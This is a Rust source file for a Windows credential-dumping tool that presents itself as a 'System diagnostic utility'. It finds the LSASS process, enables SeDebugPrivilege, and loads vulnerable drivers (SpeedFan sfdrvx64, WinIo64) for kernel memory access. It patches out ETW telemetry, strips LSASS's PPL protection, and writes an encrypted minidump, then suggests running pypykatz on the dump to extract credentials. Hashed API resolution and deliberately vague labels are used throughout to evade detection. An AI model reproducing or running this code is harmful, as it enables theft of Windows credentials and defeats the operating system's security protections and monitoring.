#![allow(dead_code)]
#![allow(unused_imports)]

mod crypto;
#[cfg(feature = "driver-loader")]
mod driver;
mod dumper;
mod hybrid64;

mod etw;
mod handle;
mod kernel_rw;
mod minidump;
mod obfstr_helper;
mod offsets;
mod ppl;
mod resolver;
mod seclogon;
mod sfdrv64;
mod syscall;
mod winio64;

use clap::{Parser, ValueEnum};
use std::process;

#[derive(Clone, ValueEnum)]
enum HandleMethod {
    /// Mode A
    Direct,
    /// Mode B
    Fork,
    /// Mode C
    Dup,
    /// Mode D
    Seclogon,
}

#[derive(Clone, ValueEnum, PartialEq)]
enum DriverType {
    /// Backend type 1
    Viragt,
    /// Backend type 2
    #[value(name = "sfdrv")]
    Sfdrv,
    /// Backend type 3
    #[value(name = "winio")]
    Winio,
    /// Backend type 4
    #[value(name = "hybrid")]
    Hybrid,
}

#[derive(Parser)]
#[command(name = "tool")]
#[command(about = "System diagnostic utility")]
struct Cli {
    /// Input file
    #[cfg(feature = "driver-loader")]
    #[arg(short, long, default_value = "input.sys")]
    driver: String,

    /// Output file path
    #[arg(short, long, default_value = "output.dmp")]
    output: String,

    /// Service identifier
    #[cfg(feature = "driver-loader")]
    #[arg(short, long, default_value = "svc")]
    service_name: String,

    /// Backend type
    #[arg(short = 't', long, value_enum, default_value_t = DriverType::Viragt)]
    driver_type: DriverType,

    /// Acquisition method
    #[arg(short, long, value_enum, default_value_t = HandleMethod::Seclogon)]
    method: HandleMethod,

    /// Encrypt output
    #[arg(long, default_value_t = false)]
    encrypt: bool,

    /// Skip restore step
    #[arg(long, default_value_t = false)]
    no_restore: bool,

    /// Skip cleanup
    #[cfg(feature = "driver-loader")]
    #[arg(long, default_value_t = true)]
    no_unload: bool,
}

fn main() {
    let cli = Cli::parse();

    let backend_name = match cli.driver_type {
        DriverType::Viragt => "type1",
        DriverType::Sfdrv => "type2",
        DriverType::Winio => "type3",
        DriverType::Hybrid => "type4",
    };

    println!("[*] v2");
    #[cfg(feature = "driver-loader")]
    println!("[*] Input: {} ({})", cli.driver, backend_name);
    #[cfg(not(feature = "driver-loader"))]
    println!("[*] Backend: {}", backend_name);
    println!("[*] Output: {}", cli.output);

    // ─── Common init ──────────────────────────────────────────────────

    println!("\n[*] Step 0: Initializing dynamic API resolver...");
    let api = match resolver::ApiResolver::init() {
        Ok(a) => {
            println!("[+] API resolver initialized via PEB walk");
            a
        }
        Err(e) => {
            eprintln!("[-] Failed to initialize API resolver: {}", e);
            process::exit(1);
        }
    };

    if !is_elevated(&api) {
        eprintln!("[-] This tool requires administrator privileges. Run as Administrator.");
        process::exit(1);
    }
    println!("[+] Running with administrator privileges");

    if !enable_se_debug_privilege() {
        eprintln!("[-] Failed to enable SeDebugPrivilege");
        process::exit(1);
    }
    println!("[+] SeDebugPrivilege enabled");

    #[cfg(feature = "driver-loader")]
    let driver_abs_str = resolve_driver_path(&cli.driver);

    // Find LSASS PID
    let lsass_pid = match handle::find_lsass_pid() {
        Some(pid) => {
            println!("[+] Found target PID: {}", pid);
            pid
        }
        None => {
            eprintln!("[-] Failed to find target process");
            process::exit(1);
        }
    };

    // Load driver (only when driver-loader feature is enabled)
    #[cfg(feature = "driver-loader")]
    let driver_guard = {
        println!("\n[*] Step 1: Loading module...");
        match driver::load_driver(&api, &cli.service_name, &driver_abs_str) {
            Ok(guard) => {
                println!("[+] Module loaded as '{}'", cli.service_name);
                guard
            }
            Err(e) => {
                eprintln!("[-] Failed to load module: {}", e);
                process::exit(1);
            }
        }
    };
    #[cfg(not(feature = "driver-loader"))]
    println!("\n[*] Step 1: Skipped (pre-loaded)");

    // ─── Branch based on driver type ──────────────────────────────────

    let dump_result = match cli.driver_type {
        DriverType::Viragt => {
            #[cfg(feature = "driver-loader")]
            {
                run_viragt_flow(&cli, &api, lsass_pid, &driver_guard)
            }
            #[cfg(not(feature = "driver-loader"))]
            {
                // viragt flow requires DriverGuard reference — not available without driver-loader
                eprintln!("[-] Mode requires --features driver-loader");
                process::exit(1);
            }
        }
        DriverType::Sfdrv => run_sfdrv_flow(&cli, &api, lsass_pid),
        DriverType::Winio => run_winio_flow(&cli, &api, lsass_pid),
        DriverType::Hybrid => run_hybrid_flow(&cli, &api, lsass_pid),
    };

    // ─── Cleanup ──────────────────────────────────────────────────────

    println!("[*] Cleaning up...");
    #[cfg(feature = "driver-loader")]
    {
        if cli.no_unload {
            println!("[!] Skipping cleanup");
            std::mem::forget(driver_guard);
        } else {
            drop(driver_guard);
            println!("[+] Cleanup complete");
        }
    }

    match dump_result {
        Ok(size) => {
            println!(
                "\n[+] SUCCESS! Output: {} ({:.2} MB)",
                cli.output,
                size as f64 / 1048576.0
            );
            if cli.encrypt {
                println!("[+] Output is encrypted.");
            }
            println!("    pypykatz lsa minidump {}", cli.output);
            println!("");
        }
        Err(e) => {
            eprintln!("\n[-] Operation failed: {}", e);
            process::exit(1);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Type 1 flow
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(feature = "driver-loader")]
fn run_viragt_flow(
    cli: &Cli,
    api: &resolver::ApiResolver,
    lsass_pid: u32,
    _driver_guard: &driver::DriverGuard,
) -> Result<u64, String> {
    println!(
        "[*] Method: {}",
        match cli.method {
            HandleMethod::Direct => "mode-A",
            HandleMethod::Fork => "mode-B",
            HandleMethod::Dup => "mode-C",
            HandleMethod::Seclogon => "mode-D",
        }
    );

    let os_offsets = match offsets::detect_offsets() {
        Some(o) => {
            println!("[+] Detected Windows build: {}", o.build_number);
            o
        }
        None => return Err("Unsupported Windows version".to_string()),
    };

    // Step 2: Open channel
    println!("[*] Step 2: Opening channel...");
    let krw = kernel_rw::ViragKernelRW::new(api).map_err(|e| format!("Channel failed: {}", e))?;
    println!("[+] Channel opened");

    // Step 3: Patch
    println!("[*] Step 3: Applying patch...");
    let etw_state = match etw::disable_etw(api) {
        Ok(state) => {
            println!("[+] Patch applied");
            state
        }
        Err(e) => {
            eprintln!("[!] Warning: Patch failed: {} (continuing)", e);
            etw::EtwState {
                etw_address: std::ptr::null_mut(),
                original_byte: 0,
                patched: false,
            }
        }
    };

    // Step 4: Protection bypass
    println!("[*] Step 4: Applying protection bypass...");
    let ppl_state = ppl::bypass_ppl(&krw, &os_offsets, lsass_pid)
        .map_err(|e| format!("Protection bypass failed: {}", e))?;
    println!(
        "[+] Bypass OK. Original: 0x{:02X}",
        ppl_state.original_protection
    );

    // Step 5: Acquire handle
    println!("[*] Step 5: Acquiring handle...");
    let lsass_handle = match &cli.method {
        HandleMethod::Direct => handle::open_lsass_direct(lsass_pid),
        HandleMethod::Fork => handle::open_lsass_fork(lsass_pid),
        HandleMethod::Dup => handle::open_lsass_dup(lsass_pid),
        HandleMethod::Seclogon => seclogon::open_lsass_seclogon(api, lsass_pid),
    }
    .map_err(|e| {
        let _ = ppl::restore_ppl(&krw, &os_offsets, &ppl_state);
        format!("Handle acquisition failed: {}", e)
    })?;
    println!("[+] Handle acquired");

    // Step 6: Build output
    println!("[*] Step 6: Building output...");
    let dump_result = minidump::create_minidump(
        api,
        lsass_handle.handle(),
        lsass_pid,
        &cli.output,
        cli.encrypt,
    );

    // Step 7: Restore PPL and ETW
    if !cli.no_restore {
        println!("[*] Step 7: Restoring...");
        match ppl::restore_ppl(&krw, &os_offsets, &ppl_state) {
            Ok(_) => println!(
                "[+] Protection restored to 0x{:02X}",
                ppl_state.original_protection
            ),
            Err(e) => eprintln!("[!] Warning: Restore failed: {}", e),
        }
        match etw::restore_etw(&etw_state) {
            Ok(_) => {
                if etw_state.patched {
                    println!("[+] ETW restored");
                }
            }
            Err(e) => eprintln!("[!] Warning: Patch restore failed: {}", e),
        }
    }

    drop(lsass_handle);
    drop(krw);
    dump_result
}

// ═══════════════════════════════════════════════════════════════════════════════
// sfdrvx64 flow: DM_KernelSyscall via SpeedFan sfdrvx64.sys
// ═══════════════════════════════════════════════════════════════════════════════

fn run_sfdrv_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Result<u64, String> {
    println!("[*] Mode: type2");
    println!("[*] Kernel mode operations\n");

    println!("[*] Step 2: Initializing engine...");
    let engine = sfdrv64::DmEngine::new(api).map_err(|e| format!("Engine init failed: {}", e))?;
    println!("[+] Engine ready");

    println!("[*] Step 3: Opening target process...");
    let lsass_handle = engine
        .open_process(lsass_pid)
        .map_err(|e| format!("Open process failed: {}", e))?;
    println!("[+] Handle acquired: {:?}", lsass_handle);

    println!("[*] Step 4: Building output...");
    let dump_result =
        minidump::create_minidump(api, lsass_handle, lsass_pid, &cli.output, cli.encrypt);

    unsafe {
        let fn_close: unsafe extern "system" fn(
            windows::Win32::Foundation::HANDLE,
        ) -> windows::Win32::Foundation::BOOL =
            std::mem::transmute(api.k32(resolver::HASH_CLOSE_HANDLE).unwrap());
        let _ = fn_close(lsass_handle);
    }

    drop(engine);
    dump_result
}

// ═══════════════════════════════════════════════════════════════════════════════
// WinIo64 flow: DM_KernelSyscall via WinIo64.sys (Section-based mapping)
// ═══════════════════════════════════════════════════════════════════════════════

fn run_winio_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Result<u64, String> {
    println!("[*] Mode: type3");
    println!("[*] Kernel mode operations\n");

    println!("[*] Step 2: Initializing engine...");
    let engine = winio64::DmEngine::new(api).map_err(|e| format!("Engine init failed: {}", e))?;
    println!("[+] Engine ready");

    println!("[*] Step 3: Opening target process...");
    let lsass_handle = engine
        .open_process(lsass_pid)
        .map_err(|e| format!("Open process failed: {}", e))?;
    println!("[+] Handle acquired: {:?}", lsass_handle);

    // Get CR3 for physical memory dump (bypasses NtReadVirtualMemory entirely)
    println!("[*] Step 3b: Acquiring CR3...");
    let cr3 = engine
        .get_process_cr3(lsass_pid)
        .map_err(|e| format!("CR3 acquisition failed: {}", e))?;

    println!("[*] Step 4: Building output via physical memory...");
    let dump_result = minidump::create_minidump_phys(
        api,
        lsass_handle,
        cr3,
        &|pa, buf| engine.read_phys(pa, buf),
        &cli.output,
        cli.encrypt,
    );

    unsafe {
        let fn_close: unsafe extern "system" fn(
            windows::Win32::Foundation::HANDLE,
        ) -> windows::Win32::Foundation::BOOL =
            std::mem::transmute(api.k32(resolver::HASH_CLOSE_HANDLE).unwrap());
        let _ = fn_close(lsass_handle);
    }

    drop(engine);
    dump_result
}

// ═══════════════════════════════════════════════════════════════════════════════
// Hybrid flow: sfdrvx64 read + WinIo64 write (Section-based mapping)
// ═══════════════════════════════════════════════════════════════════════════════

fn run_hybrid_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Result<u64, String> {
    println!("[*] Mode: type4");
    println!("[*] Kernel mode operations\n");

    println!("[*] Step 2: Initializing engine...");
    let engine = hybrid64::DmEngine::new(api).map_err(|e| format!("Engine init failed: {}", e))?;
    println!("[+] Engine ready");

    println!("[*] Step 3: Opening target process...");
    let lsass_handle = engine
        .open_process(lsass_pid)
        .map_err(|e| format!("Open process failed: {}", e))?;
    println!("[+] Handle acquired: {:?}", lsass_handle);

    println!("[*] Step 4: Building output...");
    let dump_result =
        minidump::create_minidump(api, lsass_handle, lsass_pid, &cli.output, cli.encrypt);

    unsafe {
        let fn_close: unsafe extern "system" fn(
            windows::Win32::Foundation::HANDLE,
        ) -> windows::Win32::Foundation::BOOL =
            std::mem::transmute(api.k32(resolver::HASH_CLOSE_HANDLE).unwrap());
        let _ = fn_close(lsass_handle);
    }

    drop(engine);
    dump_result
}

// ═══════════════════════════════════════════════════════════════════════════════
// Utility functions
// ═══════════════════════════════════════════════════════════════════════════════

fn is_elevated(_api: &resolver::ApiResolver) -> bool {
    use windows::Win32::Foundation::*;
    use windows::Win32::Security::*;
    use windows::Win32::System::Threading::*;

    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).is_err() {
            return false;
        }
        let mut elevation = TOKEN_ELEVATION::default();
        let mut ret_len = 0u32;
        let result = GetTokenInformation(
            token,
            TokenElevation,
            Some(&mut elevation as *mut _ as *mut _),
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut ret_len,
        );
        let _ = CloseHandle(token);
        result.is_ok() && elevation.TokenIsElevated != 0
    }
}

#[cfg(feature = "driver-loader")]
fn resolve_driver_path(cli_driver: &str) -> String {
    let driver_path = std::path::Path::new(cli_driver);
    if !driver_path.exists() {
        eprintln!("[-] Driver file not found: {}", cli_driver);
        eprintln!("    Place {} in the current directory", cli_driver);
        process::exit(1);
    }
    let abs = std::fs::canonicalize(cli_driver)
        .unwrap_or_else(|e| {
            eprintln!("[-] Failed to resolve driver path: {}", e);
            process::exit(1);
        })
        .to_string_lossy()
        .to_string();
    abs.strip_prefix("\\\\?\\").unwrap_or(&abs).to_string()
}

fn enable_se_debug_privilege() -> bool {
    use windows::core::w;
    use windows::Win32::Foundation::*;
    use windows::Win32::Security::*;
    use windows::Win32::System::Threading::*;

    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token,
        )
        .is_err()
        {
            return false;
        }

        let mut luid = LUID::default();
        if LookupPrivilegeValueW(None, w!("SeDebugPrivilege"), &mut luid).is_err() {
            let _ = CloseHandle(token);
            return false;
        }

        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        let result = AdjustTokenPrivileges(token, false, Some(&mut tp), 0, None, None);

        let _ = CloseHandle(token);
        result.is_ok()
    }
}
